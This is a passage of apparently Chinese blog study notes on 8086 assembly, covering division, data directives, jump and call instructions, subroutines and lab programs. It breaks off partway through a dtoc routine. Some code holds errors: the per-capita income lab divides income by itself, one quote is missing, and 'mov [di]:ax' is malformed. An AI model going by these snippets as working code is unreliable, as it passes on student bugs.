(dx)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+0)的余数\n\ndiv byte ptr [bx+si+8]\n含义为：(al)&#x3D;(ax)&#x2F;((ds)*16+(bx)+(si)+8)的商；\n        (ah)&#x3D;(ax)&#x2F;((ds)*16+(bx)+(si)+8)的余数\n\ndiv word ptr [bx+si+8]\n含义为： (ax)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+(bx)+(si)+0)的商；\n        (dx)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+(bx)+(si)+0)的余数\n\n8. 伪指令dd前面我们用db和dw定义字节型数据和字型数据。\ndd是用来定义dword（double word双字）型数据的。\n9. dupdup是一个操作符，在汇编语言中同db、dw、dd等一样，也是由编译器识别处理的符号。\n它是和db、dw、dd等数据定义伪指令配合使用的，用来进行数据的重复。\n\ndb 重复的次数 dup (重复的字节型数据)\ndw 重复的次数 dup (重复的字型数据)\ndd 重复的次数 dup (重复的双字型数据)\n\ndup示例：\ndb 3 dup (0)\n定义了3个字节，它们的值都是0，\n相当于db 0,0,0\n\n10. 实验：寻址方式在结构化数据访问中的应用实验情景：\nPower idea公司从1975年成立到1995年的基本情况如下：\n\n\n\n年份\n收入（千美元）\n雇员（人）\n人均收入（千美元）\n\n\n\n1975\n16\n4\n？\n\n\n1976\n22\n7\n？\n\n\n1977\n382\n10\n？\n\n\n1978\n1356\n13\n？\n\n\n1979\n2390\n28\n？\n\n\n1980\n8000\n38\n？\n\n\n…\n\n\n\n\n\n1995\n5937000\n17800\n？\n\n\n下面的代码中，已经定义好了这些数据：\nassume cs:codesg\n\ndata segment\ndb &#39;1975&#39;,&#39;1976&#39;,&#39;1977&#39;,&#39;1978&#39;,&#39;1979&#39;,1980&#39;,&#39;1981&#39;,&#39;1982&#39;,&#39;1983&#39;\ndb &#39;1984&#39;,&#39;1985&#39;,&#39;1986&#39;,&#39;1987&#39;,&#39;1988&#39;,&#39;1989&#39;,&#39;1990&#39;,&#39;1991&#39;,&#39;1992&#39;\ndb &#39;1993&#39;,&#39;1994&#39;,&#39;1995&#39;     ;以上是表示21年的21个字符串\n\ndd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140317,197514\ndd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000     \n;以上表示21年公司总收入的21个dword型数据\n\ndw 4,7,10,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226\ndw 11542,14430,15257,17800  \n;以上是表示21年公司雇员人数的21个word型数据\n\ndata ends\ntable segment\ndb 21 dup (&#39;year summ ne ??&#39;)\ntable ends\n\n编程，将data段中的数据按如下格式写入到table段中，并计算21年中的人均收入（取整），结果也按照下面的格式保存在table段中。\n\n注1：实验中需要进行21次类似操作，故需要使用Loop指令来实现循环结构，循环次数默认存放在cx寄存器中。\n例如，要计算2的20次方，其具体格式如下：\n\n                       mov ax, 2\n\n                       mov cx, 19\n\n                     s: add ax,ax\n\n                       loop  s\n\n注2：计算人均收入需要使用div指令。Div指令格式如下：\n\n                       Div 寄存器&#x2F;内存单元（除数的存放地址）\n\n被除数默认存放在AX（或DX和AX）中。\n如果除数为16位，被除数为32位，则被除数存放在DX和AX中，其中DX存放高16位，AX存放低16位。\n同时AX存放除法操作的商，DX存放除法操作的余数。\n\n例如：\ndiv word ptr ES:[0]\n\n需要注意的是，在对内存单元的访问中，使用word ptr（属性修改运算符PTR）来指明访问的内存单元是字单元。\n若使用 byte ptr，则说明访问的是字节单元。\n\n实验程序：\nassume cs:code,es:data,ds:table        \ndata segment\n    year db &#39;1975&#39;,&#39;1976&#39;,&#39;1977&#39;,&#39;1978&#39;,&#39;1979&#39;,&#39;1980&#39;,&#39;1981&#39;,&#39;1982&#39;,&#39;1983&#39;     \n    db &#39;1984&#39;,&#39;1985&#39;,&#39;1986&#39;,&#39;1987&#39;,&#39;1988&#39;,&#39;1989&#39;,&#39;1990&#39;,&#39;1991&#39;,&#39;1992&#39;\n    db &#39;1993&#39;,&#39;1994&#39;,&#39;1995&#39;   \n    ;以上是表示21年的21个字符串  \n    income dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140317,197514     \n    dd 345980,590827,803530,1183000,1843000,2759000,3753000,4649000,5937000  \n    ;以上表示21年公司总收入的21个dword型数据\n    empl dw 4,7,10,13,28,38,130,220,476,778,1001,1442,2258,2793,4037,5635,8226\n    dw 11542,14430,15257,17800\n    ;以上是表示21年公司雇员人数的21个word型数据\nends\n \ntable segment\ndb 21 dup (&#39;year summ ne ?? &#39;)  ；最后这里像实验要求的内容一样，需要留出一个空格\ntable ends\n \ncode segment\nstart:\n    mov ax,table   \n    mov ds,ax\n    mov ax,data\n    mov es,ax\n    \n    mov cx,21 ;设置循环次数\n    \n    mov si,0  ;table\n    mov di,0  ;year,income\n    mov bx,0  ;empl,average\n    ;mov bp,0  ;empl\n    \n    ;将年份移入table中\n  s:mov ax,es:year[di]\n    mov ds:[si],ax \n    mov ax,es:year[di+2]\n    mov ds:[si+2],ax\n    \n    ;将收入移入table中\n    mov ax,es:income[di]\n    mov ds:[si+5],ax\n    mov ax,es:income[di+2]\n    mov ds:[si+7],ax\n        \n    ;将雇员数移到table中\n    mov ax,es:empl[bx]\n    mov ds:[si+10],ax\n    \n    ;计算人均收入，存入table中\n    mov dx,es:income[di+2] ; 被除数为32位 dx存放高16位 \n    mov ax,es:income[di]   ; ax存放低16位\n    div word ptr es:income[di]\n    mov ds:[si+13],ax\n    \n    add si,10H\n    add di,4\n    add bx,2\n    \n    loop s          \n    \n    mov ax, 4c00h ; exit to operating system.\n    int 21h    \nends\n \nend start ; set entry point and stop the assembler.","slug":"8086汇编_05","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"c9873ffc4b3a92fe4a08884e06b8fafa","title":"8086汇编学习笔记_06","content":"转移指令的原理可以修改ip，或同时修改cs和ip的指令统称为转移指令。（就是可以控制CPU执行内存中某处代码的指令）\n\n段内转移：只修改ip（如：jmp ax）\n段间转移：同时修改cs和ip（如jmp 1000：0）\n\n其中，段内转移又分为：\n\n短转移：ip的修改范围是-128-127\n近转移：ip的修改范围是-32768-32767\n\n8086CPU的转移指令分为以下几类：\n\n无条件转移指令（如：jmp）\n条件转移指令\n循环指令（如：loop）\n过程\n中断\n\n1. 操作符offset操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。\n比如下面的程序：\nassume cs:codesg\n\ncodesg segment\nstart:  mov ax,offset start;      相当于 mov ax,偏移地址0，段地址是从0开始\n\ns:      mov ax,offset s\n;相当于 mov ax,3，标记的是代码段中的第二条指令，第一条指令长度为3个字节，则s的偏移地址为3\n\ncodesg ends\n\nend start\n\n2. jmp指令jmp位无条件转移，可以只修改IP，也可以同时修改CS和IP；\n\njmp指令需要给出两种信息\n1、转移的目的地址；\n2、转移的距离(段间转移、段内转移、段内近转移)。\n\n\n\n3. 依据位移进行转移的jmp指令\njmp short 标号 （转到标号处执行指令）\n\n这种格式的jmp指令实现的是段内短转移，它对ip的修改范围是：-128-127，也就是说，它向前转移时可以最多越过128个字节，向后转移可以最多越过127个字节。\nassume cs:codesg\ncodesg segment?\nstart:  mov ax,0?\n        jmp short s?\n        add ax,1?\n    s:  inc ax\ncodesg ends\nend start\n\n在一般的汇编指令中，汇编指令中的idata（立即数），不论它是表示一个数据还是内存单元的偏移地址，都会在对应的机器指令中出现，因为CPU执行的是机器指令，它必须要处理这些数据或地址。\njmp 0008 （ Debug 中的表示）或jmp short s（汇编语言中的表示）所对应的机器码为EB 03，注意，这个机器码中竞不包含转移的目的地址。\n这意味着，CPU 在执行EB 03的时候，并不知道转移目的地址。\n也就是说，CPU不需要这个目的地址就可以实现对IP的修改。\njmp short s指令的读取和执行过程：\n\n（1）（CS）＝0BBDH，（IP）＝0006，CS：IP指向EB 03（jmp short s的机器码）；\n\n（2）读取指令码EB 03进入指令缓冲器；\n\n（3）（IP）＝（IP）＋所读取指令的长度＝（IP）＋2＝0008，CS：IP指向add ax，1；\n\n（4）CPU指行指令缓冲器中的指令EB 03；\n\n（5）指令EB 03执行后，（IP）＝000BH，CS：IP指向inc ax。 \n\n实际上，指令“jmp short 标号”的功能为（IP）＝（IP）＋8位位移。\n\n（1）8位位移＝“标号”处的地址—jmp指令后的第一个字节的地址；\n\n（2）short指明此处的位移为8位位移；\n\n（3）8位位移的范围为-128～127，用补码表示；\n\n（4）8位位移由编译程序在编译时算出。\n\n\njmp near ptr 标号\n\n“jmp near ptr 标号”的功能为：(IP)&#x3D;(IP)+16位位移\n指令“jmp near ptr 标号”的说明：\n\n（1）16位位移＝“标号”处的地址—jmp指令后的第一个字节的地址；\n\n（2）near ptr指明此处的位移为16位位移，进行的是段内近转移；\n\n（3）16位位移的范围为-32769～32767，用补码表示；\n\n（4）16位位移由编译程序在编译时算出。\n\n4. 转移的目的地址在指令中的jmp指令前面讲的jmp指令，其对应的机器码中并没有转移的目的地址，而是相对于当前IP的转移位移。\n\njmp far ptr 标号\n\n实现的是段间转移，又称为远转移。\n指令“jmp far ptr 标号”功能如下：\n(CS)&#x3D;标号所在段的段地址；\n(IP)&#x3D;标号所在段中的偏移地址；\n\nfar ptr指明了指令用标号的段地址和偏移地址修改CS和IP。\n\n源程序中的db 256 dup（0），被Debug解释为相应的若干汇编指令。这不是关键，关键是，我们要注意一下jmp far ptr s所对应的机器码：EA 0B 01 BD 0B，其中包含转移的目的地址。\n“0B 01 BD 0B”是目的地址在指令中的存储顺序，高地址的“BD 0B”是转移的段地址：0BBDH,低地址的“0B01”是偏移地址：010BH。\n5. 转移地址在寄存器中的jmp指令指令格式：jmp 16位寄存器\n功能：IP&#x3D;（16位寄存器）\n6.转移地址在内存中的jmp指令转移地址在内存中的jmp指令有两种格式：（1）jmp word ptr 内存单元地址（段内转移）功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。\n内存单元地址可用寻址方式的任一格式给出。\n（2）jmp dword ptr 内存单元地址 （段间转移）功能：从内存单元处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。（CS）&#x3D;（内存单元地址+2）（IP）&#x3D;（内存单元地址）\n内存单元地址可用须知方式的任一格式给出。\n7. jcxz指令jcxz指令为有条件转移指令，所有的有条件转移指令都是段转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127.\n指令格式：jcxz 标号（如果（cx）&#x3D;0，则转移到标号处执行。）\njcxz 标号 指令操作：\n\n当（cx）&#x3D; 0，（IP）&#x3D;（IP）+8位位移）\n8位位移&#x3D;“标号”处的地址-jcxz指令后的第一个字节的地址；\n8位位移的范围为-128~127，用补码表示；\n8位位移由编译程序在编译时算出。\n\n\n当（cx）≠ 0，什么也不做（程序向下执行）。\n\n8. loop指令loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。\n对IP的修改范围都为-128~127.\n指令格式：loop 标号（（cx））&#x3D;（cx）-1，如果（cx）≠ 0，转移到标号处执行。\nloop 标号 指令操作：\n\n（1）（cx）&#x3D;（cx）-1；（2）如果（cx）≠0，（IP）&#x3D;（IP）+8位位移。\n8位位移&#x3D;“标号”处的地址-loop指令后的第一个字节的地址；\n8位位移的范围为-128~127，用补码表示；\n8位位移由编译程序在编译时算出。\n\n\n当（cx）&#x3D; 0，什么也不做（程序向下执行）\n\n9. 根据位移进行转移的意义之前学过的：jmp short 标号jmp near ptr 标号jcxz 标号loop 标号等几种汇编指令，它们对IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。在它们对应的机器码中不包含转移的目的地址，而包含的是到目的地址的位移距离。\n这样的设计，方便了程序段在内存中的浮动装配。\n如果loop s的机器码中包含的是s的地址，则就对程序段在内存中的偏移地址有了严格的限制；因为机器码中包含的是s的地址，如果s处的指令不在目的地址处，程序的执行就会出错。\n而loop s的机器码中包含的是转移的位移，就不存在这个问题了；因为无论s处的指令的实际地址是多少，loop指令的转移位移是不变的。\n\n\n\n\n\n\n\n\n\n注意，根据位移进行转移的指令，它们的转移范围受到转移位移的限制，如果在源程序中出现了转移范围超界的问题，在编译的时候，编译器将报错。\n10. 实验：根据材料编程1.预备知识\n80×25 彩色字符模式显示缓冲区的结构为：\n\n内存地址空间中，B8000H~BFFFFH 共 32 KB 的空间为 80×25 彩色字符模式的显示缓存区。向这个地址空间写入数据，写入的内容将立即出现在显示器上。\n在 80×25 彩色字符模式下，显示器可以显示 25 行，每行 80 个字符，每个字符可以有 256 种属性（背景色、前景色、闪烁、高亮等组合信息）。\n这样，一个字符在该显示缓冲区内占两个字节，一个字节表示字符的 ASCII 码、另一个表示字符的属性。\n80×25 模式下，显示缓冲区一共 8 页，一屏的内容在显示缓冲区总共占 4000 个字节，即表示一页，第 0 页的地址为 B8000H~B8F9FH。\n在显示器中每行 80 字符共占 160 字节，一个字符占两个字节的存储空间，低位字节存储字符的 ASCII 码、高位字节存储字节的属性值。如在显示器的 0 行 0 列显示黑底绿色的字符串 ABCDEF，字符 A 的 ASCII 码值为 41，02 表示黑底绿色字体：B800:0000   41 02 42 02 43 02 44 02 45 02 46 02 …\n\n在屏幕上显示的字符，具有前景和背景两种颜色，字符还可以有高亮度和闪烁的显示方式，这些都是表示字符的属性。各属性的表示方法如下：\n\n\n\n[7]\n[6 5 4]\n[3]\n[2  1  0]\n\n\n\nBL\nR  G  B\nI\nR  G  B\n\n\n闪烁\n背景\n高亮\n前景\n\n\nR：红色G：绿色B：蓝色\n红底绿字：0100 0010B红底闪烁绿字：1100 0010B红底高亮绿字：0100 1010B黑底白字：0000 0111B白底蓝字：0111 0001B\n注意，闪烁的效果必须在全屏DOS方式下才能看到。\n2.实验任务编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串 ‘welcome to masm!’。\n\n绿色字体对应的属性编码为 0000 0010，绿底红色对应的属性编码为 0010 0100，白底蓝色对应的属性编码为：0111 0001，十六进制分别为 02H，24H，71H。\n题目要求在屏幕中间显示字符串，80×25 彩色模式下，显示器可以显示 25 行数据，每行 80 个字符。一屏幕为 4000 字节。一共写入字节数为 1623&#x3D;96，所以字节写入范围为 1952~2047，即字符起始偏移地址为 1952（偏移地址本应为 1953，但规定偶数地址存放字符、奇数地址存放字符属性）。\n由于每个字符串需要用 16*2&#x3D;32 个字节表示，所以两两字符串间的偏移为 32。\n\n3.实验代码\nassume cs:codesg\n\ndata segment\n    db &#39;welcome to masm!&#39;    ;操作字符串\ndata ends\n\ncodesg segment\nstart:  mov ax,data \n        mov ds,ax           ;段寄存器DS指向数据段\n        mov ax,0B800h   \n        mov es,ax           ;段寄存器ES指向彩色模式区域\n        mov bx,0            ;控制字符的读取\n        mov si,1952         ;控制字符的写入，起始偏移地址为1946\n        mov cx,16           ;循环次数\n    s:  mov al,ds:[bx]      ;将当前处理字符放到寄存器AL中\n        mov es:[si],al      ;当前字符的第一个位置\n        mov ah,02h          ;第一种属性，绿色字体\n        mov es:[si+1],ah    ;当前字符的第一个属性\n        mov es:[si+32],al   ;当前字符的第二个位置，相对于第一个字符串偏移32\n        mov ah,24h          ;第二种属性，绿底红色\n        mov es:[si+32+1],ah ;当前字符的第二种属性\n        mov es:[si+64],al   ;当前字符的第三个位置，相对于第一个字符串偏移64\n        mov ah,71h          ;第三种属性，白底蓝色\n        mov es:[si+64+1],ah ;当前字符的第三种属性\n        add bx,1            ;每次偏移1个字节处理1个字符\n        add si,2            ;每次偏移2个字节写入1个字符\n        loop s \n\n        mov ax,4c00h\n        int 21h\ncodesg ends \nend start\n\ncall和ret指令call和ret指令都是转移指令，它们都修改IP，或同时修改CS和IP。\n它们经常被共同用来实现子程序的设计。\n1. ret和retf\nret指令用栈中的数据，修改IP的内容，从而实现近转移；\nretf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。\n\nCPU执行ret指令时，进行下面两步操作：（1）（IP）&#x3D;（（ss）* 16 +（sp））（2）（sp）&#x3D;（sp）+ 2\nCPU执行retf指令时，进行下面四步操作：（1）（IP）&#x3D;（（ss）* 16 +（sp））（2）（sp）&#x3D;（sp）+ 2（3）（CS）&#x3D;（（ss）* 16 +（sp））（4）（sp）&#x3D;（sp）+ 2\n可以看出，如果我们用汇编语法来解释ret和retf指令，则：\n\nCPU执行ret指令时，相当于进行：pop IP\nCPU执行retf指令时，相当于进行：pop IPpop CS\n\n2. call指令call指令经常跟ret指令配合使用，因此CPU执行call指令时，进行两步操作：（1）将当前的IP或CS和IP压入栈中（2）转移（jmp）\ncall指令不能实现短转移，除此之外，call实现转移的方法和jmp指令的原理相同。\n3. 依据位移进行转移的call指令call 标号 （将当前的IP压栈后，转到标号处执行指令）\nCPU执行此种格式的call指令时，进行如下的操作：\n\n（sp）&#x3D;（sp）- 2（（ss）*16+（sp））&#x3D;（IP）\n\n（IP）&#x3D;（IP）+16位位移\n\n\ncall 标号\n\n16位位移&#x3D;“标号”处的地址 - call指令后的第一个字节的地址；\n16位位移的范围为-32768~32767，用补码表示；\n16位位移由编译程序在编译时算出。\n\nCPU执行“call 标号”时，相当于进行：\n\npush IP\njmp near ptr 标号\n\n4. 转移的目的地址在指令中的call指令前面的call指令，其对应的机器指令中并没有转移的目的地址，而是相对于当前IP的转移位移。\n指令“call far ptr 标号”实现的是段间转移。\nCPU执行“call far ptr 标号”这种格式的call指令是的操作：\n\n（sp）&#x3D;（sp）- 2（（ss）* 16 +（sp））&#x3D;（CS）（sp）&#x3D;（sp）-2（（ss）*16 +（sp））&#x3D;（IP）\n\n（CS）&#x3D;标号所在的段地址（IP）&#x3D;标号所在的偏移地址\n\n\nCPU执行指令“call far ptr 标号”时，相当于进行：push CSpush IPjmp far ptr 标号\n5. 转移地址在寄存器中的call指令指令格式：call 16位寄存器\n功能：（sp）&#x3D;（sp）- 2（（ss）* 16 +（sp））&#x3D;（IP）（IP）&#x3D;（16位寄存器）\n汇编语法解释此种格式的call指令，CPU执行“call 16位reg”时，相当于进行：push IPjmp 16位寄存器\n6. 转移地址在内存中的call指令转移地址在内存中的call指令有两种格式：（1）call word ptr 内存单元（2）call dword ptr 内存单元\n\ncall word ptr 内存单元地址\n\n汇编语法解释：push IPjmp word ptr 内存单元地址\n\n\ncall dword ptr 内存单元地址\n\n汇编语法解释：push CSpush IPjmp dword ptr 内存单元地址\n\n\n\n7. call和ret的配合使用\n\n写一个具有一定功能的程序段，我们称其为子程序，在需要的时候，用call指令转去执行。\n\n可是执行完子程序后，如何让CPU接着call指令向下执行？答：ret指令。call指令后面的指令的地址将存储在栈中，所以可以在子程序的后面使用ret指令，用栈中的数据设置IP的值，从而转到call指令后面得到代码处继续执行。\n\n这样，我们可以利用call和ret来实现子程序的机制。\n\n\n具有子程序的源程序框架如下：\nassume cs:code\ncode segment\n    main: \n            ..\n            ..\n            call sub1    ;调用子程序sub1\n            ..\n            mov ax,4c00h\n            int 21h\n\n    sub1:\n            ..           ;子程序sub1开始\n            call sub2    ;调用子程序sub2\n            ..\n            ret          ;sub1子程序返回\n    sub2:\n            ..           ;子程序sub2开始\n            ..\n            ret          ;sub2子程序返回\ncode ends\nend main\n\n8. mul指令mul是乘法指令，使用mul做乘法的时候：（1）相乘的两个数：要么都是8位，要么都是16位；\n8位：AL中和8位寄存器或内存字节单元中；16位：AX中和16位寄存器或内存字单元中；\n（2）结果8位：AX中；16位：DX（高位）和AX（低位）中。\n格式如下：mul regmul 内存单元\n内存单元可以用不同的寻址方式给出，比如：\n\nmul byte ptr ds:[0]\n\n含义为：（ax）＝（al）＊（（ds）＊16＋0）；\n\n\nmul word ptr [bx+si+8]\n\n含义为：（ax）＝（ax）＊（（ds）＊16＋（bx）＋（si）＋8）结果的低16位；（dx）＝（ax）＊（（ds）＊16＋（bx）＋（si）＋8）结果的高16位；\n\n\n\n9. 模块化程序设计从上面我们看到，call与ret指令共同支持了汇编语言编程中的模块化设计。在实际编程中，程序的模块化是必不可少的。\ncall和ret指令对这种分析提供了程序实现上的支持。利用call和ret指令，我们可以用简洁的方法，实现多个相互联系、功能独立的子程序来解决一个复杂的问题。\n10. 参数和结果传递的问题子程序一般都要根据提供的参数处理一定的事物，处理后将结果（返回值）提供给调用者。\n其实我们讨论参数和返回值传递的问题，实际上就是在探讨，应该如何存储子程序需要的参数和产生的返回值。\n很显然，我们可以用寄存器来存储，可以将参数放到bx中；\n因为子程序中要计算N * N * N，可以使用多个mul指令，为了方便，可将结果放到dx和ax中。\n子程序：\n说明：计算N的3次方\n参数：（bx）&#x3D; N\n结果：（dx:ax）&#x3D; N^3\ncube:   mov ax,bx\n        mul bx\n        mul bx\n        ret\n\n注意，我们在编程的时候要注意良好的风格，对于程序应有详细的注释。子程序的注释信息应该包含对子程序的功能、参数和结果的说明。\n因为今天写的子程序，以后可能还会用到；自己写的子程序，也很可能要给别人使用，所以一定要有全面的说明。\n用寄存器来存储参数和结果是最常使用的方法。对于存放参数的寄存器和存放结果的寄存器，调用着和子程序的读写操作恰恰相反：\n\n调用者将参数送入参数寄存器，从结果寄存器中取到返回值；\n子程序从参数寄存器中取到参数，将返回值送入结果寄存器。\n\n编程：计算data段中第一组数据的3次方，结果保存在后面一组dword单元中。\n\nassume cs:codesg\n\ndata segment\n    dw 1,2,3,4,5,6,7,8\n    dd 0,0,0,0,0,0,0,0\ndata ends\n\ncode segment\n\nstart:  mov ax,data\n        mov ds,ax\n        mov si,0\n        mov di,16\n\n        mov cx,8\n    s:  mov bx,[si]\n        call cube\n        mov [di]:ax\n        mov [di].2,dx\n        add si,2    ;ds:si指向下一个word单元\n        add di,4    ;ds:di指向下一个dword单元\n        loop s\n\n        mov ax,4c00h\n        int 21h\n\ncube:   mov ax,bx\n        mul bx\n        mul bx\n        ret\n\ncode ends\nend start\n\n11. 批量数据的传递寄存器的数量终究有限，我们不可能简单地用寄存器来存放多个需要传递地数据。对于返回值，也有同样地问题。\n在这种时候，我们将批量数据放到内存中，然后将他们所在内存空间地首地址放在寄存器中，传递给需要的子程序。\n对于具有批量数据地返回结果，也可以用同样地方法。\n注意：除了寄存器、内存传递参数外，还有一种通用的方法，使用栈来传递参数。\n12. 寄存器冲突的问题设计一个子程序：功能：将一个全是字母，以0结尾的字符串，转化为大写。\n程序要处理的字符串以0作为结尾符，字符串可以如下定义：db ‘conversation’,0\n分析：应用这个子程序，字符串的内容后面定要有一个0，标记字符串的结束。字符串可以一次读取每个字符串进行检测，如果不是0，就进行大写的转化。如果是0，就结束处理。\n由于可通过检测0而知道是否已经处理完整个字符串，所以子程序可以不需要字符串的长度作为参数。我们可以直接用jcxz来检测0。\n子程序实现代码：capital:    mov cl,[si]            mov ch,0            jcxz ok            and byte ptr [si],11011111b            inc si            jmp short capital    ok: ret\n13. 实验：编写子程序\n1.显示字符串\n\n问题显示字符串是现实工作中经常要用到的功能，应该编写一个通用的子程序来实现这个功能。我们应该提供灵活的调用接口，使调用者可以决定显示的位置（行、列）、内容和颜色。\n提示（1）  子程序的入口参数是屏幕上的行号和列号，注意在子程序内部要将它们转化为显存中的地址，首先要分析一下屏幕上的行列位置和显存地址的对应关系：（2）  注意保存子程序中用到的相关寄存器：（3）  这个子程序的内部处理和显存的结构密切相关，但是向外提供了与显存结构无关的接口。通过调用这个子程序，进行字符串的显示时可以不必了解显存的结构，为编程提供了方便。在实验中，注意体会这种设计思想。\n子程序描述名称：show_str功能：在指定的位置，用指定的颜色，显示一个用0结束的字符串。参数：(dh)&#x3D;行号（取值范围0~24）,(dl)&#x3D;列号(取值范围0 ~ 79),    (cl)&#x3D;颜色，ds:si指向字符串的首地址返回：无就用举例：在屏幕的8行3列，用绿色显示data段中的字符串。\n代码\nassume cs:code\n   data segment\n   db &#39;Welcome to masm!&#39;,0\n   data ends\n\n code segment\n   start:  mov dh,8\n           mov dl,3\n           mov cl,2\n           mov ax,data\n           mov ds,ax\n           mov si,0\n           call show_str\n           mov ax,4c00h\n           int 21h\n   show_str: push dx\n             push cx\n             push ds\n             push si\n\n     mov ax,0b800h\n     mov es,ax\n     \n     mov al,160\n     mul dh\n     mov bx,ax\n     mov al,2\n     mul dl\n     add bx,ax\n    mov al,cl\n    \n         s: mov cl,[si] \n              jcxz ok\n              mov dx,[si]\n              mov es:[bx],dx\n              mov es:[bx+1],al\n              inc si\n              add bx,2\n              loop s\n\n ok:             \n  pop si\n  pop ds\n  pop cx\n  pop dx\nret\ncode ends\nend start \n\n\n2.解决除法溢出问题\n\n问题前面讲过，div指令可以做除法。当进行8位除法的时候，用al存储结果的商，ah存储结果的余数：进行16位除法的时候，用ax存储结果的商，dx存储结果的余数。可是，现在有一个问题，如果结果的商大于ah或ax所能存储的最大值，那么将如何？比如，下面的程序段： mov bh,1 mov ax,1000 div bh进行的是8位除法，结果的商为1000，而1000在ah中放不下，又比如，下面的程序段：mov ax,1000hmov dx,1mov bx,1div bx进行的是16位除法，结果的商为11000H,而11000H在ax中存放不下。\n我们在用div指令做除法的时候，很可能发生上面的情况：结果的商过大，超出了寄存器所能存储的范围。\n当CPU执行div等除法指令的时候。如果发生这样的情况，将引发CPU的一个内部错误。这个错误被称为：除法溢出。\n我们可以通过特殊的程序来处理这个错误，这里我们不讨论这个错误的处理，这是后面的课程中要涉及的内容。\n好了，我们已经清楚了问题的所在：用div指令做除法的时候可能产生除法溢出。由于有这样的问题，在进行除法运算的时候要注意除数和被除数的值，比如1000000&#x2F;10就不能用div指令来计算。那么怎么办呢？我们用下面的子程序divdw解决。\n子程序描述名称：divdw功能：进行不会产生溢出的除法运算，被除数为dword型，除数为word型，结果为dword型。参数：(ax)&#x3D;dword型数据的低16位    (dx)&#x3D;dword型数据的高16位    (cx)&#x3D;除数返回：(dx)&#x3D;结果的高16位，(ax)&#x3D;结果的低16位    (cx)&#x3D;余数应用举例：计算1000000&#x2F;10(F4240H&#x2F;0AH)  mov ax,4240h  mov v dx,000fh  mov cx,0ah  call divdw\n提示给出一个公式：\nX：被除数，范围：[0,FFFF FFFF]N：除数，范围：[0,FFFF]H：X高16位，范围：[0,FFFF]L：X低16位，范围：[0,FFFF]\nint()：描述性运算符，取商，比如：rem(38&#x2F;10)&#x3D;8rem()：描述性运算符，取答数，比如：rem(38&#x2F;10)&#x3D;8\n公式：X&#x2F;N&#x3D;int(H&#x2F;N)*65536+[rem(H&#x2F;N)*65536+L]&#x2F;N\n这个公式将可能产生溢出的除法运算：X&#x2F;N，转变为多个不会产生溢出的除法运算。公式中，等号右边的所有除法运算都可以用div指令来做，肯定不会导致除法溢出。\nassume cs:code\n\ncode segment\nstart:  mov ax,4240h\n        mov dx,000fh\n        mov cx,0Ah\n        call divdw\n        mov ax,4c00H\n        int 21h\ndivdw:      ;子程序定义开始\n      push ax           ;低16位先保存\n      mov ax,dx         ;ax这时候的值是高16位了\n      mov dx,0          ;dx置0是为了不影响下边余数位，使得最高16位为0\n      div cx            ;H&#x2F;N\n      mov bx,ax         ;ax，bx的值为（int）H&#x2F;N，dx的值为（rem）H&#x2F;N\n      pop ax            ;ax的值现在是L\n      div cx            ;L&#x2F;N，注意，16位除法的时候默认被除数DX为高16位，AX为低16位\n      mov cx,dx\n      mov dx,bx\n      ret    ;子程序定义结束\n    code ends\nend start\n\n\n3.数值显示\n\n问题编程，将data段中的数据以十进制的形式显示出来。\ndata segment\ndw 123,12666,1,8,3,38\ndata ends\n\n  这些数据在内存中都是二进制信息，标记了数值的大小。\n  要把它们显示到屏幕上，成为我们能够读懂的信息，需要进行信息的转化。\n  比如，数值12666，在机器中存储为二进制信息：0011000101111010B(317AH)，计算机可以理解它。而我们要在显示器上读到可以理解的数值12666，我们看到的应该是一串字符：“12666”。\n  由于显卡遵循的是ASCII编码，为了让我们能在显示器上看到这串字符，它在机器中应以ASCII码的形式存储为：31H、32H、36H、36H、36H（字符“0”~“9”对应的ASCII码为30H ~ 39H）。\n  通过上面的分析可以看到，在概念世界中，有一个抽象的数据12666，它表示了一个数值的大小。\n  在现实世界中它可以有多种表示形式，可以在电子机器中以高低电平（二进制）的形式存储，也可以在纸上、黑板上、屏幕上以人类的语言“12666”来书写。\n  现在，我们面临的问题就是，要将同一抽象的数据，从一种表示形式转化为另一种表示形式。\n  可见，要将数据用十进制形式显示到屏幕上，要进行两步工作：（1）  将用二进制信息存储的数据转变为十进制形式的字符串：（2）  显示十进制形式的字符串。\n第二步我们在本次实验的第一个子程序中已经实现，在这里只要调用一下show_str即可。我们来讨论第一步，因为将二进制信息转变为十进制形式的字符串也是经常要用到的功能，我们应该为它编写一个通用的子程序。\n子程序描述名称：dtoc功能：将word型数据转变为表示十进制数的字符串，字符串以0为结尾符。参数：(ax)&#x3D;word型数据    ds:si指向字符串的首地址返回：无应用举例：编程，将数据12666以十进制的形式在屏幕的8行3列，用绿色显示出来。在显示时我们调用本次实验中的第一个子程序show-str。\nassume cs:code\n\ndata segment\n  db 16 dup(0)  ; 定义一个长度为16的数据段\ndata ends\n\n \ncode segment\nstart:  mov ax,12666  ; 将要显示的数字存储在寄存器ax中\n\n        mov bx,data     ; ds:si指向字符串的首地址\n        mov ds,bx\n        mov si,0\n\n        call dtoc       ; 调用子程序将整数转换为ASCII码字符串并存储在data段中\n\n        mov dh,8        ; 初始化打印的位置\n        mov dl,3\n        mov cl,2\n\n        call show_str   ; 开始打印字符串\n\n        mov ax,4c00h\n        int 21h        ; 程序结束\n\ndtoc:       ; 数值显示的子程序定义\n       mov cx,ax    \n       jcxz bk       ; 如果ax为0，则跳转到bk标签\n       push ax\n       mov al,ah\n       mov ah,0\n       mov bl,10\n       div bl\n       mov cl,al\n       mov ch,ah\n       pop ax\n       mov ah,ch\n       div bl\n       mov dl,ah\n       mov dh,0\n       push dx\n       mov ah,cl\n       jmp short dtoc   ; 跳转到dtoc标签\n\n    